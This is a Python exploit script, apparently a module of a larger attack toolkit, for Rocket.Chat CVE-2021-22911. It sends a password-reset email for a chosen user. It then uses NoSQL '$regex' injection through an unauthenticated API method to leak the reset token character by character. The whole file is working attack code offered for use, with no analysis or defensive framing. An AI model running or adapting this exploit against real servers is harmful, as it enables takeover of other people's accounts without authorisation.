#!/user/bin/env python3
# -*- coding: utf-8 -*-
import sys
import time
import string
import json
import requests,urllib3
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet

urllib3.disable_warnings()
guess = '-_' + string.digits + string.ascii_letters
session = requests.session()
hds = None
session.headers = {
    'Content-Type': 'application/json',
}


class Cve_2021_22911:
    def reset_password(self,target: str, email: str):
        payload = {
            'msg': 'method',
            'method': 'sendForgotPasswordEmail',
            'params': [email],
        }

        session.post(
            f'{target}/api/v1/method.callAnon/sendForgotPasswordEmail',
            json={'message': json.dumps(payload)},verify=self.ssl,proxies=self.proxy
        )
        sys.stdout.write("[+] Password Reset Email Sent\n")
        sys.stdout.flush()

    def inject_token(self,target: str):
        payload = {
            'msg': 'method',
            'method': 'getPasswordPolicy',
            'params': [
                {
                    'token': {'$regex': '^'}
                }
            ],
        }
        for i in range(43):
            current = payload['params'][0]['token']['$regex']
            sys.stdout.write(f'[*] Guess No.{i + 1} character: ')
            for ch in guess:
                payload['params'][0]['token']['$regex'] = current + ch
                response = session.post(
                    f'{target}/api/v1/method.callAnon/getPasswordPolicy',
                    json={'message': json.dumps(payload)},verify=self.ssl,proxies=self.proxy
                )
                if b'Meteor.Error' not in response.content:
                    sys.stdout.write(f"\n[+] Current token is {payload['params'][0]['token']['$regex'][1:]}\n")
                    sys.stdout.flush()
                    break
                else:
                    sys.stdout.write('.')
                    sys.stdout.flush()

                time.sleep(1.5)


    def main(self,target):
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        useremail = target["useremail"]
        _, self.proxy = ReqSet(proxy=proxy)

        OutPrintInfo("Rocket Chat", '开始执行Rocket Chat CVE-2021-22911...')
        self.reset_password(url, useremail)
        self.inject_token(url)
        OutPrintInfo("Rocket Chat", 'Rocket Chat CVE-2021-22911执行结束')
